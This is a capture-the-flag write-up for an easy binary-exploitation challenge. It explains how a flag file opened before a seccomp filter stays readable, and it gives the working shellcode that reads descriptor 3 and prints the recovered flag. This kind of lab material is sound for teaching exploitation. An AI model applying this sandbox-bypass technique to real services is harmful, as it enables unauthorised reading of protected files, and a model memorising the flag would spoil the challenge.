# Muted Shell

- **Lab / Category:** PWN
- **Points:** (see metadata)
- **Difficulty:** easy
- **Status:** ✅ SOLVED

## Vulnerability — shellcode with a pre-opened flag FD, seccomp too late
`main` does, in order: `open("flag")` (→ fd **3**), `mmap` an **RWX** buffer, print a prompt,
`read(0, buf, N)` shellcode into it, `install_seccomp()`, then `call *buf`. Because the flag is
opened **before** the seccomp filter, fd 3 stays open — the filter blocks `open`/`execve` but not
`read`/`write` on an existing descriptor. (Binary: PIE, no canary, RWX segment.)

## Exploit — read fd 3, write to stdout
```asm
mov rdi,3 ; mov rsi,rsp ; mov rdx,0x100 ; xor eax,eax ; syscall   ; read(3,rsp,0x100)
mov rdi,1 ; mov rsi,rsp ; mov rdx,rax ; mov eax,1 ; syscall        ; write(1,rsp,n)
mov eax,60 ; xor edi,edi ; syscall                                 ; exit(0)
```
Send the raw bytes after the prompt; the server prints the flag.
(Assembled off-box since local pwntools had no `as`; connection made from a host that can reach
the TCP gateway.)

## Flag
`FlagY{34a46d9e96758f5474d57be9315a6580}`
